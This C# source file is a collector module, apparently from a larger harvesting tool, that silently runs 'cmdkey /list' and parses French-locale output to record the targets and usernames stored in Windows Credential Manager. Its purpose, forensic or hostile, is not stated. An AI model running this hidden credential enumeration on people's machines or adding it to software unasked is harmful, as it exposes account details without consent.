using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace LegalHarvest.Modules
{
    public class WindowsCredentialManagerModule : ICollectorModule
    {
        public string ModuleName => "WindowsCredentials";
        public bool CanExecute() => true;

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            try
            {
                var process = new Process()
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmdkey",
                        Arguments = "/list",
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                foreach (Match match in Regex.Matches(output, @"Cible : (.*?)\r?\n.*?Utilisateur : (.*?)\r?\n", RegexOptions.Singleline))
                    items.Add(new CollectedItem { Category = "WindowsCredentials", Name = match.Groups[1].Value.Trim(), Value = match.Groups[2].Value.Trim(), Timestamp = DateTime.Now });
            }
            catch { }
            return items;
        }
    }
}
